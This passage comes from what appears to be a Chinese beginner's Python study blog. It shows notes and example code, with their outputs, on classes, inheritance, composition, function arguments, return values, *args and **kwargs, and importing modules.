class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = 0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def undate_odometer(self, milliage):</span><br><span class="line">        self.odometer_reading = milliage</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line"></span><br><span class="line">    def increaing_odometer(self, miles):</span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line">class electorcar(car):</span><br><span class="line">    def __init__(self,make,model,year):</span><br><span class="line">        super().__init__(make,model,year)</span><br><span class="line">        self.battery_size = 75</span><br><span class="line"></span><br><span class="line">    def describe_battery(self):</span><br><span class="line">        print(f&quot;this car has a &#123;self.battery_size&#125; - km battery&quot;)</span><br><span class="line"></span><br><span class="line">my_tesla = electorcar(&#x27;tesla&#x27;,&#x27;model s&#x27;,2020)</span><br><span class="line">print(my_tesla.get_descript_name())</span><br><span class="line">my_tesla.describe_battery()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020  Model S  Tesla</span><br><span class="line">this car has a 75 - km battery</span><br></pre></td></tr></table></figure><h6 id="重写父类的方法"><a href="#重写父类的方法" class="headerlink" title="重写父类的方法"></a>重写父类的方法</h6><p>对于父类的方法重写，可以在子类中定义一个与要冲写的父类方法同名的方法。</p><h6 id="将实例当做属性"><a href="#将实例当做属性" class="headerlink" title="将实例当做属性"></a>将实例当做属性</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print, super</span><br><span class="line"></span><br><span class="line">class car:</span><br><span class="line">    def __init__(self, maek, model, year):</span><br><span class="line">        self.make = maek</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = 0</span><br><span class="line"></span><br><span class="line">    def read_odometer(self):</span><br><span class="line">        print(f&quot;this car has &#123;self.odometer_reading&#125; mile on it&quot;)</span><br><span class="line"></span><br><span class="line">    def undate_odometer(self, milliage):</span><br><span class="line">        self.odometer_reading = milliage</span><br><span class="line"></span><br><span class="line">    def get_descript_name(self):</span><br><span class="line">        long_name = f&quot;&#123;self.year&#125;  &#123;self.model&#125;  &#123;self.make&#125;&quot;</span><br><span class="line">        return long_name.title()</span><br><span class="line"></span><br><span class="line">    def increaing_odometer(self, miles):</span><br><span class="line">        self.odometer_reading += miles</span><br><span class="line"></span><br><span class="line">class Battery:</span><br><span class="line">    def __init__(self,battery_size=75):</span><br><span class="line">        self.battery_size = battery_size</span><br><span class="line">    def describe_battery(self):</span><br><span class="line">        print(f&quot;this car has a &#123;self.battery_size&#125;-kwh battery.&quot;)</span><br><span class="line"></span><br><span class="line">class electorcar(car):</span><br><span class="line">    def __init__(self,make,model,year):</span><br><span class="line">        super().__init__(make, model,year)</span><br><span class="line">        self.battery= Battery()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_tesla = electorcar(&#x27;tesla&#x27;,&#x27;model s&#x27;,2020)</span><br><span class="line">print(my_tesla.get_descript_name())</span><br><span class="line">my_tesla.battery.describe_battery()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020  Model S  Tesla</span><br><span class="line">this car has a 75-kwh battery.</span><br></pre></td></tr></table></figure><h6 id="导入类"><a href="#导入类" class="headerlink" title="导入类"></a>导入类</h6><p>导入所有类的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from  ()   import *</span><br></pre></td></tr></table></figure><p>使用别名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from () import ()  as ()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyhton--从入门到入土---函数</title>
      <link href="/2025/01/08/2023%E5%B9%B43%E6%9C%8827%E6%97%A5-Pyhton-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E5%87%BD%E6%95%B0/"/>
      <url>/2025/01/08/2023%E5%B9%B43%E6%9C%8827%E6%97%A5-Pyhton-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>函数</p><h6 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h6><p>开头使用关键字def定义函数，中间添加需要定义的函数的名字，结尾部分别忘了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def greet_user():</span><br><span class="line">print(&quot;Hello a&quot;)</span><br><span class="line">greet_user()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello a</span><br></pre></td></tr></table></figure><h6 id="向函数中传递信息"><a href="#向函数中传递信息" class="headerlink" title="向函数中传递信息"></a>向函数中传递信息</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def greet_user(user_name):</span><br><span class="line">&quot;&quot;&quot;表示最简单的问候&quot;&quot;&quot;</span><br><span class="line">print(f&quot;Hello a,&#123;user_name.title()&#125;&quot;)</span><br><span class="line">greet_user(&#x27;jess&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello a,Jess</span><br></pre></td></tr></table></figure><p>传递实参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def describe_pet(animal_type,pet_name):</span><br><span class="line">   print(f&quot;i have a &#123;animal_type&#125;&quot;)</span><br><span class="line">   print(f&quot;my &#123;animal_type&#125;&#x27;s name is &#123;pet_name&#125;.&quot;)</span><br><span class="line">describe_pet(&#x27;dog&#x27;,&#x27;king&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i have a dog</span><br><span class="line">my dog&#x27;s name is king.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里将实参dog赋给形参animal_type，而实参king被赋给pet_name，这种基于实参的位置顺序的关联方式称之为位置实参</p><h6 id="多次调用函数"><a href="#多次调用函数" class="headerlink" title="多次调用函数"></a>多次调用函数</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def describe_pet(animal_type,pet_name):</span><br><span class="line">print(f&quot;i have a &#123;animal_type&#125;&quot;)</span><br><span class="line">print(f&quot;my &#123;animal_type&#125;&#x27;s name is &#123;pet_name&#125;.&quot;)</span><br><span class="line">describe_pet(&#x27;小黑子&#x27;,&#x27;真下头&#x27;)</span><br><span class="line">describe_pet(&#x27;汪汪队&#x27;,&#x27;立大功&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i have a 小黑子</span><br><span class="line">my 小黑子&#x27;s name is 真下头.</span><br><span class="line">i have a 汪汪队</span><br><span class="line">my 汪汪队&#x27;s name is 立大功.</span><br></pre></td></tr></table></figure><h6 id="关键字实参"><a href="#关键字实参" class="headerlink" title="关键字实参"></a>关键字实参</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def describe_pet(animal_type, pet_name):</span><br><span class="line">    print(f&quot;i have a &#123;animal_type&#125;&quot;)</span><br><span class="line">    print(f&quot;my &#123;animal_type&#125;&#x27;s name is &#123;pet_name&#125;.&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">describe_pet(animal_type=&#x27;小黑子&#x27;, pet_name=&#x27;真下头&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i have a 小黑子</span><br><span class="line">my 小黑子&#x27;s name is 真下头.</span><br></pre></td></tr></table></figure><p>关键字实参的顺序无所谓，但是需要准确制定函数定义中的形参名</p><h6 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h6><p>编写函数式，可以给每个形参指定默认值，在调用函数中都给形参提供实参时，Python将使用指定的实参值，否则将会使用形参的默认值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def describe_pet(pet_name,animal_type=&#x27;dog&#x27;):</span><br><span class="line">    print(f&quot;i have a &#123;animal_type&#125;&quot;)</span><br><span class="line">    print(f&quot;my &#123;animal_type&#125;&#x27;s name is &#123;pet_name&#125;.&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">describe_pet(pet_name=&#x27;汪汪队立大功&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i have a dog</span><br><span class="line">my dog&#x27;s name is 汪汪队立大功.</span><br></pre></td></tr></table></figure><h6 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h6><p>·函数并非是直接显示输出，它还可以处理一些数据，并返回一个或者一组值。函数返回的值称之为返回值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def name(first_name,last_name):</span><br><span class="line">full_name=f&quot;&#123;first_name&#125;  &#123;last_name&#125;&quot;</span><br><span class="line">return full_name.title()</span><br><span class="line">musician = name(&#x27;a&#x27;,&#x27;hahaha&#x27;)</span><br><span class="line">print(musician)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A  Hahaha</span><br></pre></td></tr></table></figure><p>这里的返回值是full.name转换成首字母大写形式</p><h6 id="让实参变成可选的"><a href="#让实参变成可选的" class="headerlink" title="让实参变成可选的"></a>让实参变成可选的</h6><p>可以使用默认值是实参变成可选的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def name(first_name,last_name,middle_name=&#x27;&#x27;):</span><br><span class="line">if middle_name:</span><br><span class="line">full_name=f&quot;&#123;first_name&#125; &#123;middle_name&#125; &#123;last_name&#125;&quot;</span><br><span class="line">else:</span><br><span class="line">full_name=f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</span><br><span class="line"></span><br><span class="line">return full_name.title()</span><br><span class="line">musician = name(&#x27;a&#x27;,&#x27;hahaha&#x27;)</span><br><span class="line">print(musician)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A Hahaha</span><br></pre></td></tr></table></figure><h6 id="返回字典"><a href="#返回字典" class="headerlink" title="返回字典"></a>返回字典</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line">def name_in(first_name,last_name):</span><br><span class="line">person = &#123;&#x27;ffirst&#x27;:first_name,&#x27;last&#x27;:last_name&#125;</span><br><span class="line">return person</span><br><span class="line">musician = name_in(&#x27;奥拓&#x27;,&#x27;阿波卡利斯&#x27;)</span><br><span class="line">print(musician)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;ffirst&#x27;: &#x27;奥拓&#x27;, &#x27;last&#x27;: &#x27;阿波卡利斯&#x27;&#125;</span><br></pre></td></tr></table></figure><h6 id="结合使用函数以及while循环"><a href="#结合使用函数以及while循环" class="headerlink" title="结合使用函数以及while循环"></a>结合使用函数以及while循环</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line">def name_in(first_name,last_name):</span><br><span class="line">full_name = f&quot;&#123;first_name&#125;&#123;last_name&#125;&quot;</span><br><span class="line">return full_name.title()</span><br><span class="line">while True:</span><br><span class="line">print(&#x27;Hello everybody&#x27;)</span><br><span class="line">print(&#x27;please input your first name and last name&#x27;)</span><br><span class="line">f_name = input(&quot;Please input your first name:&quot;)</span><br><span class="line">if f_name == &#x27;quit&#x27;:</span><br><span class="line">break</span><br><span class="line">l_name = input(&quot;Please input your last name:&quot;)</span><br><span class="line">if l_name == &#x27;quit&#x27;:</span><br><span class="line">break</span><br><span class="line">name_out=name_in(f_name,l_name)</span><br><span class="line">print(name_out)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Hello everybody</span><br><span class="line">please input your first name and last name</span><br><span class="line">Please input your first name:a</span><br><span class="line">Please input your last name:a</span><br><span class="line">Aa</span><br><span class="line">Hello everybody</span><br><span class="line">please input your first name and last name</span><br><span class="line">Please input your first name:a</span><br><span class="line">Please input your last name:_a</span><br><span class="line">A_A</span><br><span class="line">Hello everybody</span><br><span class="line">please input your first name and last name</span><br><span class="line">Please input your first name:a</span><br><span class="line">Please input your last name:quit</span><br></pre></td></tr></table></figure><h6 id="传递列表"><a href="#传递列表" class="headerlink" title="传递列表"></a>传递列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def greet_user(names):</span><br><span class="line">for name in names:</span><br><span class="line">message = f&quot;hello  &#123;name.title()&#125;&quot;</span><br><span class="line">print(message)</span><br><span class="line">username = [&#x27;haah&#x27;,&#x27;xixi&#x27;,&#x27;wangwang&#x27;]</span><br><span class="line">greet_user(username)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello  Haah</span><br><span class="line">hello  Xixi</span><br><span class="line">hello  Wangwang</span><br></pre></td></tr></table></figure><h6 id="在函数中修改列表"><a href="#在函数中修改列表" class="headerlink" title="在函数中修改列表"></a>在函数中修改列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unprint_Designed = [&#x27;phone&#x27;,&#x27;robot&#x27;,&#x27;dodecahedron&#x27;]</span><br><span class="line">print_designeds = []</span><br><span class="line"></span><br><span class="line">while unprint_Designed:</span><br><span class="line">current_design = unprint_Designed.pop()</span><br><span class="line">print(f&quot;printing model:&#123;current_design&#125;&quot;)</span><br><span class="line">print_designeds.append(current_design)</span><br><span class="line">print(&quot;the following models have been printed:&quot;)</span><br><span class="line">for print_designed in print_designeds:</span><br><span class="line">print(print_designed)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printing model:dodecahedron</span><br><span class="line">printing model:robot</span><br><span class="line">printing model:phone</span><br><span class="line">the following models have been printed:</span><br><span class="line">dodecahedron</span><br><span class="line">robot</span><br><span class="line">phone</span><br></pre></td></tr></table></figure><p>使用函数来进行编写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def print_model(unprinted_designeds,completed_models):</span><br><span class="line">while unprinted_designeds:</span><br><span class="line">current_print = unprinted_designeds.pop()</span><br><span class="line">print(f&quot;printing models:&#123;current_print&#125;&quot;)</span><br><span class="line">completed_models.append(current_print)</span><br><span class="line">def show_completed(completed_models):</span><br><span class="line">print(&quot;the following models have been printed:&quot;)</span><br><span class="line">for completed_model in completed_models:</span><br><span class="line">print(completed_model)</span><br><span class="line">unprint_designs = [&#x27;phone&#x27;,&#x27;computer&#x27;,&#x27;robot&#x27;]</span><br><span class="line">complete_models = []</span><br><span class="line"></span><br><span class="line">print_model(unprint_designs,complete_models)</span><br><span class="line">show_completed(complete_models)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printing models:robot</span><br><span class="line">printing models:computer</span><br><span class="line">printing models:phone</span><br><span class="line">the following models have been printed:</span><br><span class="line">robot</span><br><span class="line">computer</span><br><span class="line">phone</span><br></pre></td></tr></table></figure><h6 id="切片表示法-禁止访问列表"><a href="#切片表示法-禁止访问列表" class="headerlink" title="切片表示法[:]禁止访问列表"></a>切片表示法[:]禁止访问列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from builtins import print</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def print_model(unprinted_designeds, completed_models):</span><br><span class="line">    while unprinted_designeds:</span><br><span class="line">        current_print = unprinted_designeds.pop()</span><br><span class="line">        print(f&quot;printing models:&#123;current_print&#125;&quot;)</span><br><span class="line">        completed_models.append(current_print)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show_completed(completed_models):</span><br><span class="line">    print(&quot;the following models have been printed:&quot;)</span><br><span class="line">    for completed_model in completed_models:</span><br><span class="line">        print(completed_model)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unprint_designs = [&#x27;phone&#x27;, &#x27;computer&#x27;, &#x27;robot&#x27;]</span><br><span class="line">complete_models = []</span><br><span class="line">print_model(unprint_designs[:],complete_models)</span><br><span class="line">show_completed(complete_models)</span><br><span class="line">print(unprint_designs)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">printing models:robot</span><br><span class="line">printing models:computer</span><br><span class="line">printing models:phone</span><br><span class="line">the following models have been printed:</span><br><span class="line">robot</span><br><span class="line">computer</span><br><span class="line">phone</span><br><span class="line">[&#x27;phone&#x27;, &#x27;computer&#x27;, &#x27;robot&#x27;]</span><br></pre></td></tr></table></figure><p>这个就是在下面调用函数的时候建立一个切片来进行运算，这个切片的话当做中间件就好</p><h6 id="传递任意数量的实参"><a href="#传递任意数量的实参" class="headerlink" title="传递任意数量的实参"></a>传递任意数量的实参</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def making_pizza(*toppomgs):</span><br><span class="line">print(&quot;\nmaking a pizza whit the ffollowing topping&quot;)</span><br><span class="line">for topping in toppomgs:</span><br><span class="line">print(f&quot;-&#123;topping&#125;&quot;)</span><br><span class="line">making_pizza(&#x27;pepperoni&#x27;)</span><br><span class="line">making_pizza(&#x27;mushrooms&#x27;,&#x27;green peppers&#x27;,&#x27;extra cheese&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">making a pizza whit the ffollowing topping</span><br><span class="line">-pepperoni</span><br><span class="line"></span><br><span class="line">making a pizza whit the ffollowing topping</span><br><span class="line">-mushrooms</span><br><span class="line">-green peppers</span><br><span class="line">-extra cheese</span><br></pre></td></tr></table></figure><p>在这里的话，*toppings这里的星号定义了一个空元组（元组的话见操作列表）并将所有的值封装到这个空元组中</p><h6 id="结合使用位置实参和任意数量实参"><a href="#结合使用位置实参和任意数量实参" class="headerlink" title="结合使用位置实参和任意数量实参"></a>结合使用位置实参和任意数量实参</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def making_pizza(size,*toppomgs):</span><br><span class="line">print(f&quot;making a &#123;size&#125; pizza whit the ffollowing topping&quot;)</span><br><span class="line">for topping in toppomgs:</span><br><span class="line">print(f&quot;-&#123;topping&#125;&quot;)</span><br><span class="line">making_pizza(12,&#x27;pepperoni&#x27;)</span><br><span class="line">making_pizza(16,&#x27;mushrooms&#x27;,&#x27;green peppers&#x27;,&#x27;extra cheese&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">making a 12 pizza whit the ffollowing topping</span><br><span class="line">-pepperoni</span><br><span class="line">making a 16 pizza whit the ffollowing topping</span><br><span class="line">-mushrooms</span><br><span class="line">-green peppers</span><br><span class="line">-extra cheese</span><br></pre></td></tr></table></figure><p>使用任意数量的关键字实参</p><p>**可以创建一个空字典</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def build_profit(first,last,**user_name):</span><br><span class="line">user_name[&#x27;first_name&#x27;] = first</span><br><span class="line">user_name[&#x27;last_name&#x27;] = last</span><br><span class="line">return user_name</span><br><span class="line">user_profile = build_profit(&#x27;齐格飞&#x27;,&#x27;卡斯兰娜&#x27;,</span><br><span class="line">location = &#x27;圣芙蕾雅学园&#x27;,</span><br><span class="line">says = &#x27;我将发动一次nb的攻击&#x27;)</span><br><span class="line">print(user_profile)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;location&#x27;: &#x27;圣芙蕾雅学园&#x27;, &#x27;says&#x27;: &#x27;我将发动一次nb的攻击&#x27;, &#x27;first_name&#x27;: &#x27;齐格飞&#x27;, &#x27;last_name&#x27;: &#x27;卡斯兰娜&#x27;&#125;</span><br></pre></td></tr></table></figure><h6 id="导入整个模块"><a href="#导入整个模块" class="headerlink" title="导入整个模块"></a>导入整个模块</h6><p>先建立一个python文件，里面输入写好的def，保存为pizza.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def making_pizza(size,*toppings):</span><br><span class="line">   print(f&quot;making a &#123;size&#125; pizza whit the following topping&quot;)</span><br><span class="line">   for topping in toppings:</span><br><span class="line">      print(f&quot;-&#123;topping&#125;&quot;)</span><br></pre></td></tr></table></figure><p>然后再这个文件所在的目录下在新建一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import pizza</span><br><span class="line">pizza.making_pizza(16,&#x27;pepperont&#x27;)</span><br><span class="line">pizza.making_pizza(21,&#x27;cheese&#x27;,&#x27;huge&#x27;,&#x27;mushrooms&#x27;)</span><br></pre></td></tr></table></figure><p>使用import让python打开文件pizza.py</p><p>，并将其中的线索有的函数都复制到这个程序中，你看不到复制的代码，因为在这个程序运行时，Python在幕后复制了这些代码。要调用被导入模块的函数，可指定被导入模块的名称pizza和函数名making_pizza（），并用句号来分隔开</p><h6 id="当然也可以显性的调用函数"><a href="#当然也可以显性的调用函数" class="headerlink" title="当然也可以显性的调用函数"></a>当然也可以显性的调用函数</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pizza import making_pizza</span><br><span class="line">making_pizza(16,&#x27;pepperont&#x27;)</span><br><span class="line">making_pizza(21,&#x27;cheese&#x27;,&#x27;huge&#x27;,&#x27;mushrooms&#x27;)</span><br></pre></td></tr></table></figure><p>这样也是可行的，而且这样的话不需要在每一个前面添加句号</p><h6 id="使用as来给函数指定别名"><a 